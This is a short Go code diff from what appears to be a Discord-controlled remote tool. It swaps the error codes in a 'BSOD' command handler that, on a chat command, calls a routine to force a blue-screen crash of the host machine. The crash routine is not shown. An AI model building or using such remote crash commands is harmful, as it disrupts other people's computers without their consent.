@@ -14,11 +14,11 @@ const bsodRaiseError string = "🟥 Failed to raise hard error: %s"
 func (*BSODCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
 	code, err := funcs.BlueScreen()
 	switch code {
-	case -2:
+	case -1:
 		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(misc.ERROR_F_ADJUST_PRIVILEGE, err), m.Reference())
 		return
 
-	case -1:
+	case -2:
 		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(bsodRaiseError, err), m.Reference())
 		return
 	}
